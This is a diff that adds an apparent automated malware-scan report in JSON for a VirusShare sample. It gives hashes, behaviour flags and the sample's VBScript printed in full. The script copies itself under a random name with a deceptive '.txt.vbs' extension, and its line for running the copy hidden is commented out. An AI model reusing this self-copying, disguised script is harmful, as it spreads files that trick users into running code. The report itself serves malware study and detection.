@@ -1,0 +1,54 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "Chr": "May attempt to obfuscate specific str",
+            "CreateObject": "May create an OLE object",
+            "Run": "May run an executable file or a system command",
+            "Shell": "May run an executable file or a system command",
+            "VbHide": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command"
+        },
+        "macro": "Randomize: On Error Resume Next\nSet FSO = CreateObject(\"Scripting.FileSystemObject\")\nSet Shell = CreateObject(\"WScript.Shell\")\nSet HOME = FSO.GetFolder(\".\")\n\nmsgbox \"Home\", Home\n'Rest 120\n\nSet Me_ = FSO.GetFile(WScript.ScriptFullName)\nBaby = HOME & \"\\\" & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & \".txt.vbs\"\nMe_.Copy(Baby)\n'Shell.Run Baby, VbHide\n\nSub Rest(HowLong)\nCurrent = Timer\nDo While Timer - Current < HowLong\nLoop\nEnd Sub"
+    },
+    "filename": "VirusShare_36b9170b9bc5cf028eb9fdf024ef2fb2",
+    "filesize": 640,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "36b9170b9bc5cf028eb9fdf024ef2fb2",
+        "sha1": "0188313447757d0d979ae348a80e4cf2d57e9ce2",
+        "sha256": "e14cd1d6fa9291102a733c0e4c186ff7923c56e132ab472d5195afb9ac9d67c7"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "Randomize: On Error Resume Next",
+            "Set FSO = CreateObject(\"Scripting.FileSystemObject\")",
+            "Set Shell = CreateObject(\"WScript.Shell\")",
+            "Set HOME = FSO.GetFolder(\".\")",
+            "msgbox \"Home\", Home",
+            "'Rest 120",
+            "Set Me_ = FSO.GetFile(WScript.ScriptFullName)",
+            "Baby = HOME & \"\\\" & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & \".txt.vbs\"",
+            "Me_.Copy(Baby)",
+            "'Shell.Run Baby, VbHide",
+            "Sub Rest(HowLong)",
+            "Current = Timer",
+            "Do While Timer - Current < HowLong",
+            "Loop",
+            "End Sub"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.284665",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
